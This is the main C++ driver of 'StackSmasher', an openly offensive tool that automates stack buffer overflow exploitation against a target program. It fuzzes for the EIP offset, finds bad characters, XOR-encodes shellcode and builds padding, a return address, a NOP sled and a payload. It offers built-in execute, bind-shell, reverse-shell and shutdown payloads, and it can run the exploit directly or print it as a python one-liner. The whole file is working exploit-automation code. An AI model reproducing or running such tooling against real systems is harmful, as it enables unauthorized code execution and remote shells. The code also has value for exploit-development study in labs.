#include <iostream>
#include <string>
#include "argparse.hpp"
#include "Log/Log.hpp"
#include "Utility/Filesystem/File.hpp"
#include "Payloads/Execute/Execute.hpp"
#include "Payloads/BindShell/BindShell.hpp"
#include "Payloads/ReverseShell/ReverseShell.hpp"
#include "Payloads/Shutdown/Shutdown.hpp"
#include "Encoder/XorEncoder.hpp"
#include "Stages/Fuzzer/Fuzzer.hpp"
#include "Stages/BadCharacters/BadCharacters.hpp"

int main(int argc, char* argv[])
{
    // Arguments
    argparse::ArgumentParser program("StackSmasher", "1.0.0");
    program.add_argument("application").help("The target application being tested");
    program.add_argument("-p", "--payload").help("The built-in payload to use. [execute, bind-shell, reverse-shell, shutdown]").nargs(1).default_value(std::string("execute")).action([](const std::string& value) {
        static const std::vector<std::string> choices = { "execute", "bind-shell", "reverse-shell", "shutdown" };
        if (std::find(choices.begin(), choices.end(), value) != choices.end()) {
            return value;
        }
        return std::string("sh");
    });
    program.add_argument("-pf", "--payload-file").help("The binary payload file to be sent instead of built-in payload.").nargs(1).default_value(std::string(""));
    program.add_argument("-v", "--verbose").help("Verbosity level: 0-4.").nargs(1).default_value(1).action([](const std::string& value) { return std::stoi(value); });
    program.add_argument("-n", "--nops").help("The number of NOPs to put in the NOP sled before the shell.").nargs(1).default_value(20).action([](const std::string& value) { return std::stoi(value); });
    program.add_argument("-q", "--quiet").help("Do not print the start header.").default_value(false).implicit_value(true);
    program.add_argument("-e", "--exploit").help("Automatically run the full payload against the application.").default_value(false).implicit_value(true);
    program.add_argument("--python").help("Print the exploit as a python script.").default_value(false).implicit_value(true);
    program.add_argument("--binary").help("The binary the application should execute if a built-in payload is selected.").nargs(1).default_value(std::string("/bin/sh"));
    program.add_argument("--shell-ip").help("The IP address a reverse shell should connect to.").nargs(1).default_value(std::string("127.0.0.1"));
    program.add_argument("--shell-port").help("The port number a bind shoud listen on or a reverse shell should connect to.").nargs(1).default_value(1337).action([](const std::string& value) { return std::stoi(value); });
    program.add_argument("--skip-aslr-check").help("Skip checking if ASLR is enabled and proceed anyway.").default_value(false).implicit_value(true);
    program.add_argument("--skip-encoding").help("Skip encoding the payload and checking bad characters.").default_value(false).implicit_value(true);
    program.add_argument("--no-colour").help("Do not output ANSI escape codes to show colours.").default_value(false).implicit_value(true);

    // Argument Parsing
    try {
        program.parse_args(argc, argv);
    }
    catch (const std::runtime_error& err) {
        std::cout << err.what() << std::endl << std::endl;
        std::cout << program;
        exit(0);
    }

    Log::verbose = (VerbosityLevel)program.get<int>("--verbose");
    Log::colour = program["--no-colour"] == false;
    std::string application = program.get<std::string>("application");

    // Header
    if (program["--quiet"] == false)
    {
        std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << "   _____ __             __   " << (Log::colour ? LOG_COLOUR_GREEN : "") << "_____                      __             " << std::endl;
        std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << "  / ___// /_____ ______/ /__" << (Log::colour ? LOG_COLOUR_GREEN : "") << "/ ___/____ ___  ____ ______/ /_  ___  _____" << std::endl;
        std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << "  \\__ \\/ __/ __ `/ ___/ //_/" << (Log::colour ? LOG_COLOUR_GREEN : "") << "\\__ \\/ __ `__ \\/ __ `/ ___/ __ \\/ _ \\/ ___/" << std::endl;
        std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << " ___/ / /_/ /_/ / /__/ ,<  " << (Log::colour ? LOG_COLOUR_GREEN : "") << "___/ / / / / / / /_/ (__  ) / / /  __/ /    " << std::endl;
        std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << "/____/\\__/\\__,_/\\___/_/|_|" << (Log::colour ? LOG_COLOUR_GREEN : "") << "/____/_/ /_/ /_/\\__,_/____/_/ /_/\\___/_/     " << std::endl;
        std::cout << (Log::colour ? LOG_COLOUR_NONE : "") << "                                                                       " << std::endl;
        std::cout << "                    By https://github.com/McCaulay                     " << std::endl << std::endl;
    }

    // Ensure ASLR is disabled
    if (program["--skip-aslr-check"] == false && Application::isAslrEnabled())
    {
        Log::error(VerbosityLevel::Standard, "ASLR is enabled but not supported by this application.\n");
        return 3;
    }

    // Payload variables
    std::string shell = "";
    size_t rawPayloadSize = 0;
    uint8_t* rawPayload = nullptr;

    // Read payload from file
    std::string payloadFile = program.get<std::string>("--payload-file");
    if (!payloadFile.empty())
    {
        rawPayload = File::readAllBytes(program.get<std::string>("--payload-file"), &rawPayloadSize);
        if (rawPayload == nullptr)
        {
            Log::error(VerbosityLevel::Standard, "Failed to read the payload file.\n");
            return 4;
        }
    }
    else
    {
        // Get built-in payload
        std::string payloadType = program.get<std::string>("--payload");
        if (payloadType == "execute")
            rawPayload = Execute::getPayload(&rawPayloadSize, program);
        else if (payloadType == "reverse-shell")
            rawPayload = ReverseShell::getPayload(&rawPayloadSize, program);
        else if (payloadType == "bind-shell")
            rawPayload = BindShell::getPayload(&rawPayloadSize, program);
        else if (payloadType == "shutdown")
            rawPayload = Shutdown::getPayload(&rawPayloadSize, program);
    }

    // Run the fuzzer to find EIP
    if (!Fuzzer::run(application))
        return 5;

    // Find bad characters
    if (program["--skip-encoding"] == false)
    {
        if (!BadCharacters::run(application))
            return 5;

        // Encode shell
        Log::info(VerbosityLevel::Standard, "XOR encoding payload...\n");
        shell = XorEncoder::encode(rawPayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());
    }
    else
        shell = std::string((char*)rawPayload, rawPayloadSize);

    // Free raw payload
    free(rawPayload);
    rawPayload = nullptr;

    // Build payload
    Payload* payloadBuilder = Payload::builder()
        ->padding()
        ->eip();

    // NOP Sled
    int nops = program.get<int>("--nops");
    if (nops > 0)
        payloadBuilder->nopSled(nops);

    payloadBuilder->append(shell);
    std::string payload = payloadBuilder->get();
    delete payloadBuilder;

    // Output python command
    if (program["--python"] == true)
    {
        std::string python = "";
        for (uint32_t i = 0; i < payload.length(); i++)
        {
            char buffer[5];
            sprintf(buffer, "\\x%02x", (uint8_t)(payload[i]));
            python += std::string(buffer);
        }
        Log::success(VerbosityLevel::Standard, "[%i bytes] python -c 'print(\"%s\")'\n", payload.length(), python.c_str());
    }

    if (program["--exploit"] == true)
    {
        Log::success(VerbosityLevel::Standard, "Executing application with payload...\n_________________________________________\n\n");
        Process::exec(application, { payload });
    }
    return 0;
}
